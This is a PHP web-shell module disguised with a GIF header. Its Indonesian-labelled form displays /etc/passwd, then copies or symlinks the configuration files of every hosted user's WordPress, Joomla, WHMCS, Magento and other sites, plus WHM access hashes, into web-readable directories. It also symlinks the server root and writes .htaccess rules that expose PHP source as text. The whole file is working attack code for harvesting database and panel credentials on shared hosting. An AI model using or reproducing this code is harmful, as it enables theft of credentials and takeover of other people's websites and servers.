GIF8root7a;
<?php
if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
	    echo '<script>alert("Tidak bisa di gunakan di server windows")</script>';
	    exit;
	    }
	    if($_POST){ if($_POST['config'] == 'symvhosts') {
	    @mkdir("hgt_symvhosts", 0777);
	    exe("ln -s / hgt_symvhosts/root");
	    $htaccess="Options Indexes FollowSymLinks
	    DirectoryIndex hgt.html
	    AddType text/plain .php 
	    AddHandler text/plain .php
	    Satisfy Any";
	    @file_put_contents("hgt_symvhosts/.htaccess",$htaccess);
	        $etc_passwd=$_POST['passwd'];
	        
	        $etc_passwd=explode("\n",$etc_passwd);
	    foreach($etc_passwd as $passwd){
	    $pawd=explode(":",$passwd);
	    $user =$pawd[5];
	    $hgt = preg_replace('/\/var\/www\/vhosts\//', '', $user);
	    if (preg_match('/vhosts/i',$user)){
	    exe("ln -s ".$user."/httpdocs/wp-config.php hgt_symvhosts/".$hgt."-Wordpress.txt");
	    exe("ln -s ".$user."/httpdocs/configuration.php hgt_symvhosts/".$hgt."-Joomla.txt");
	    exe("ln -s ".$user."/httpdocs/config/koneksi.php hgt_symvhosts/".$hgt."-Lokomedia.txt");
	    exe("ln -s ".$user."/httpdocs/forum/config.php hgt_symvhosts/".$hgt."-phpBB.txt");
	    exe("ln -s ".$user."/httpdocs/sites/default/settings.php hgt_symvhosts/".$hgt."-Drupal.txt");
	    exe("ln -s ".$user."/httpdocs/config/settings.inc.php hgt_symvhosts/".$hgt."-PrestaShop.txt");
	    exe("ln -s ".$user."/httpdocs/app/etc/local.xml hgt_symvhosts/".$hgt."-Magento.txt");
	    exe("ln -s ".$user."/httpdocs/admin/config.php hgt_symvhosts/".$hgt."-OpenCart.txt");
	    exe("ln -s ".$user."/httpdocs/application/config/database.php hgt_symvhosts/".$hgt."-Ellislab.txt"); 
	    }}}
	    if($_POST['config'] == 'symlink') {
	    @mkdir("hgt_symconfig", 0777);
	    @symlink("/","hgt_symconfig/root");
	    $htaccess="Options Indexes FollowSymLinks
	    DirectoryIndex hgt.html
	    AddType text/plain .php 
	    AddHandler text/plain .php
	    Satisfy Any";
	    @file_put_contents("hgt_symconfig/.htaccess",$htaccess);}
	    if($_POST['config'] == '404') {
	    @mkdir("hgt_sym404", 0777);
	    @symlink("/","hgt_sym404/root");
	    $htaccess="Options Indexes FollowSymLinks
	    DirectoryIndex hgt.html
	    AddType text/plain .php 
	    AddHandler text/plain .php
	    Satisfy Any
	    IndexOptions +Charset=UTF-8 +FancyIndexing +IgnoreCase +FoldersFirst +XHTML +HTMLTable +SuppressRules +SuppressDescription +NameWidth=*
	    IndexIgnore *.txt404
	    RewriteEngine On
	    RewriteCond %{REQUEST_FILENAME} ^.*hgt_sym404 [NC]
	    RewriteRule \.txt$ %{REQUEST_URI}404 [L,R=302.NC]";
	    @file_put_contents("hgt_sym404/.htaccess",$htaccess);
	    }
	    if($_POST['config'] == 'grab') {
      mkdir("hgt_configgrab", 0777);
      $isi_htc = "Options all\nRequire None\nSatisfy Any";
      $htc = fopen("hgt_configgrab/.htaccess","w");
      fwrite($htc, $isi_htc); 
	    }
	    $passwd = $_POST['passwd'];
	    
	    preg_match_all('/(.*?):x:/', $passwd, $user_config);
	    foreach($user_config[1] as $user_hgt) {
	    $grab_config = array(
	    "/home/$user_hgt/.accesshash" => "WHM-accesshash",
	    "/home/$user_hgt/public_html/config/koneksi.php" => "Lokomedia",
	    "/home/$user_hgt/public_html/forum/config.php" => "phpBB",
	    "/home/$user_hgt/public_html/sites/default/settings.php" => "Drupal",
	    "/home/$user_hgt/public_html/config/settings.inc.php" => "PrestaShop",
	    "/home/$user_hgt/public_html/app/etc/local.xml" => "Magento",
	    "/home/$user_hgt/public_html/admin/config.php" => "OpenCart",
	    "/home/$user_hgt/public_html/application/config/database.php" => "Ellislab",
	    "/home/$user_hgt/public_html/vb/includes/config.php" => "Vbulletin",
	    "/home/$user_hgt/public_html/includes/config.php" => "Vbulletin",
	    "/home/$user_hgt/public_html/forum/includes/config.php" => "Vbulletin",
	    "/home/$user_hgt/public_html/forums/includes/config.php" => "Vbulletin",
	    "/home/$user_hgt/public_html/cc/includes/config.php" => "Vbulletin",
	    "/home/$user_hgt/public_html/inc/config.php" => "MyBB",
	    "/home/$user_hgt/public_html/includes/configure.php" => "OsCommerce",
	    "/home/$user_hgt/public_html/shop/includes/configure.php" => "OsCommerce",
	    "/home/$user_hgt/public_html/os/includes/configure.php" => "OsCommerce",
	    "/home/$user_hgt/public_html/oscom/includes/configure.php" => "OsCommerce",
	    "/home/$user_hgt/public_html/products/includes/configure.php" => "OsCommerce",
	    "/home/$user_hgt/public_html/cart/includes/configure.php" => "OsCommerce",
	    "/home/$user_hgt/public_html/inc/conf_global.php" => "IPB",
	    "/home/$user_hgt/public_html/wp-config.php" => "Wordpress",
	    "/home/$user_hgt/public_html/wp/test/wp-config.php" => "Wordpress",
	    "/home/$user_hgt/public_html/blog/wp-config.php" => "Wordpress",
	    "/home/$user_hgt/public_html/beta/wp-config.php" => "Wordpress",
	    "/home/$user_hgt/public_html/portal/wp-config.php" => "Wordpress",
	    "/home/$user_hgt/public_html/site/wp-config.php" => "Wordpress",
	    "/home/$user_hgt/public_html/wp/wp-config.php" => "Wordpress",
	    "/home/$user_hgt/public_html/WP/wp-config.php" => "Wordpress",
	    "/home/$user_hgt/public_html/news/wp-config.php" => "Wordpress",
	    "/home/$user_hgt/public_html/wordpress/wp-config.php" => "Wordpress",
	    "/home/$user_hgt/public_html/test/wp-config.php" => "Wordpress",
	    "/home/$user_hgt/public_html/demo/wp-config.php" => "Wordpress",
	    "/home/$user_hgt/public_html/home/wp-config.php" => "Wordpress",
	    "/home/$user_hgt/public_html/v1/wp-config.php" => "Wordpress",
	    "/home/$user_hgt/public_html/v2/wp-config.php" => "Wordpress",
	    "/home/$user_hgt/public_html/press/wp-config.php" => "Wordpress",
	    "/home/$user_hgt/public_html/new/wp-config.php" => "Wordpress",
	    "/home/$user_hgt/public_html/blogs/wp-config.php" => "Wordpress",
	    "/home/$user_hgt/public_html/configuration.php" => "Joomla",
	    "/home/$user_hgt/public_html/blog/configuration.php" => "Joomla",
	    "/home/$user_hgt/public_html/submitticket.php" => "^WHMCS",
	    "/home/$user_hgt/public_html/cms/configuration.php" => "Joomla",
	    "/home/$user_hgt/public_html/beta/configuration.php" => "Joomla",
	    "/home/$user_hgt/public_html/portal/configuration.php" => "Joomla",
	    "/home/$user_hgt/public_html/site/configuration.php" => "Joomla",
	    "/home/$user_hgt/public_html/main/configuration.php" => "Joomla",
	    "/home/$user_hgt/public_html/home/configuration.php" => "Joomla",
	    "/home/$user_hgt/public_html/demo/configuration.php" => "Joomla",
	    "/home/$user_hgt/public_html/test/configuration.php" => "Joomla",
	    "/home/$user_hgt/public_html/v1/configuration.php" => "Joomla",
	    "/home/$user_hgt/public_html/v2/configuration.php" => "Joomla",
	    "/home/$user_hgt/public_html/joomla/configuration.php" => "Joomla",
	    "/home/$user_hgt/public_html/new/configuration.php" => "Joomla",
	    "/home/$user_hgt/public_html/WHMCS/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/whmcs1/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/Whmcs/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/whmcs/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/whmcs/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/WHMC/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/Whmc/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/whmc/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/WHM/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/Whm/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/whm/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/HOST/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/Host/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/host/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/SUPPORTES/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/Supportes/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/supportes/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/domains/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/domain/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/Hosting/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/HOSTING/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/hosting/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/CART/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/Cart/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/cart/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/ORDER/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/Order/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/order/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/CLIENT/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/Client/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/client/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/CLIENTAREA/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/Clientarea/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/clientarea/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/SUPPORT/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/Support/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/support/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/BILLING/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/Billing/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/billing/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/BUY/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/Buy/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/buy/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/MANAGE/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/Manage/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/manage/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/CLIENTSUPPORT/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/ClientSupport/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/Clientsupport/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/clientsupport/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/CHECKOUT/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/Checkout/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/checkout/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/BILLINGS/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/Billings/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/billings/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/BASKET/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/Basket/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/basket/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/SECURE/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/Secure/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/secure/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/SALES/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/Sales/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/sales/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/BILL/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/Bill/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/bill/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/PURCHASE/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/Purchase/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/purchase/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/ACCOUNT/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/Account/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/account/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/USER/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/User/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/user/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/CLIENTS/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/Clients/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/clients/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/BILLINGS/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/Billings/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/billings/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/MY/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/My/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/my/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/secure/whm/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/secure/whmcs/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/panel/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/clientes/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/cliente/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/support/order/submitticket.php" => "WHMCS",
	    "/home/$user_hgt/public_html/bb-config.php" => "BoxBilling",
	    "/home/$user_hgt/public_html/boxbilling/bb-config.php" => "BoxBilling",
	    "/home/$user_hgt/public_html/box/bb-config.php" => "BoxBilling",
	    "/home/$user_hgt/public_html/host/bb-config.php" => "BoxBilling",
	    "/home/$user_hgt/public_html/Host/bb-config.php" => "BoxBilling",
	    "/home/$user_hgt/public_html/supportes/bb-config.php" => "BoxBilling",
	    "/home/$user_hgt/public_html/support/bb-config.php" => "BoxBilling",
	    "/home/$user_hgt/public_html/hosting/bb-config.php" => "BoxBilling",
	    "/home/$user_hgt/public_html/cart/bb-config.php" => "BoxBilling",
	    "/home/$user_hgt/public_html/order/bb-config.php" => "BoxBilling",
	    "/home/$user_hgt/public_html/client/bb-config.php" => "BoxBilling",
	    "/home/$user_hgt/public_html/clients/bb-config.php" => "BoxBilling",
	    "/home/$user_hgt/public_html/cliente/bb-config.php" => "BoxBilling",
	    "/home/$user_hgt/public_html/clientes/bb-config.php" => "BoxBilling",
	    "/home/$user_hgt/public_html/billing/bb-config.php" => "BoxBilling",
	    "/home/$user_hgt/public_html/billings/bb-config.php" => "BoxBilling",
	    "/home/$user_hgt/public_html/my/bb-config.php" => "BoxBilling",
	    "/home/$user_hgt/public_html/secure/bb-config.php" => "BoxBilling",
	    "/home/$user_hgt/public_html/support/order/bb-config.php" => "BoxBilling",
	    "/home/$user_hgt/public_html/includes/dist-configure.php" => "Zencart",
	    "/home/$user_hgt/public_html/zencart/includes/dist-configure.php" => "Zencart",
	    "/home/$user_hgt/public_html/products/includes/dist-configure.php" => "Zencart",
	    "/home/$user_hgt/public_html/cart/includes/dist-configure.php" => "Zencart",
	    "/home/$user_hgt/public_html/shop/includes/dist-configure.php" => "Zencart",
	    "/home/$user_hgt/public_html/includes/iso4217.php" => "Hostbills",
	    "/home/$user_hgt/public_html/hostbills/includes/iso4217.php" => "Hostbills",
	    "/home/$user_hgt/public_html/host/includes/iso4217.php" => "Hostbills",
	    "/home/$user_hgt/public_html/Host/includes/iso4217.php" => "Hostbills",
	    "/home/$user_hgt/public_html/supportes/includes/iso4217.php" => "Hostbills",
	    "/home/$user_hgt/public_html/support/includes/iso4217.php" => "Hostbills",
	    "/home/$user_hgt/public_html/hosting/includes/iso4217.php" => "Hostbills",
	    "/home/$user_hgt/public_html/cart/includes/iso4217.php" => "Hostbills",
	    "/home/$user_hgt/public_html/order/includes/iso4217.php" => "Hostbills",
	    "/home/$user_hgt/public_html/client/includes/iso4217.php" => "Hostbills",
	    "/home/$user_hgt/public_html/clients/includes/iso4217.php" => "Hostbills",
	    "/home/$user_hgt/public_html/cliente/includes/iso4217.php" => "Hostbills",
	    "/home/$user_hgt/public_html/clientes/includes/iso4217.php" => "Hostbills",
	    "/home/$user_hgt/public_html/billing/includes/iso4217.php" => "Hostbills",
	    "/home/$user_hgt/public_html/billings/includes/iso4217.php" => "Hostbills",
	    "/home/$user_hgt/public_html/my/includes/iso4217.php" => "Hostbills",
	    "/home/$user_hgt/public_html/secure/includes/iso4217.php" => "Hostbills",
	    "/home/$user_hgt/public_html/support/order/includes/iso4217.php" => "Hostbills"
	    );  
	    
	    foreach($grab_config as $config => $nama_config) {
	      if($_POST['config'] == 'grab') {
	    $ambil_config = file_get_contents($config);
	    if($ambil_config == '') {
	    } else {
	    $file_config = fopen("hgt_configgrab/$user_hgt-$nama_config.txt","w");
	    fputs($file_config,$ambil_config);
	    }
	    }
	    if($_POST['config'] == 'symlink') {
	    @symlink($config,"hgt_Symconfig/".$user_hgt."-".$nama_config.".txt");
	    }
	    if($_POST['config'] == '404') {
	    $sym404=symlink($config,"hgt_sym404/".$user_hgt."-".$nama_config.".txt");
	    if($sym404){
	      @mkdir("hgt_sym404/".$user_hgt."-".$nama_config.".txt404", 0777);
	      $htaccess="Options Indexes FollowSymLinks
	    DirectoryIndex hgt.html
	    HeaderName hgt.txt
	    Satisfy Any
	    IndexOptions IgnoreCase FancyIndexing FoldersFirst NameWidth=* DescriptionWidth=* SuppressHTMLPreamble
	    IndexIgnore *";
	    
	    @file_put_contents("hgt_sym404/".$user_hgt."-".$nama_config.".txt404/.htaccess",$htaccess);
	    
	    @symlink($config,"hgt_sym404/".$user_hgt."-".$nama_config.".txt404/hgt.txt");
	    
	      }
	    
	    }
	    
              }     
	        }  if($_POST['config'] == 'grab') {
      echo "<center><a href='?path=$path/hgt_configgrab'><font color=lime>Done</font></a></center>";
	        }
	        if($_POST['config'] == '404') {
  echo "<center>
	    <a href=\"hgt_sym404/root/\">Symlinknya</a>
	    <br><a href=\"hgt_sym404/\">Configurations</a></center>";
	        }
	         if($_POST['config'] == 'symlink') {
	    echo "<center>
	    <a href=\"hgt_symconfig/root/\">Symlinknya</a>
	    <br><a href=\"hgt_symconfig/\">Configurations</a></center>";
}if($_POST['config'] == 'symvhost') {
	    echo "<center>
	    <a href=\"hgt_symvhost/root/\">Root Server</a>
	    <br><a href=\"hgt_symvhost/\">Configurations</a></center>";
}
	        
	        
	        }else{
  echo "<form method=\"post\" action=\"\"><center>
	        </center></select><br><textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
  echo include("/etc/passwd"); 
  echo "</textarea><br><br><center>
  <select class=\"select\" name=\"config\"  style=\"width: 450px;\" height=\"10\">
  <option value=\"grab\">Config Grab</option>
  <option value=\"symlink\">Symlink Config</option>
	        <option value=\"404\">Config 404</option>
	        <option value=\"symvhosts\">Vhosts Config Grabber</option><br><br><input type=\"submit\" value=\"Start!!\"></td></tr></center>\n";
	    }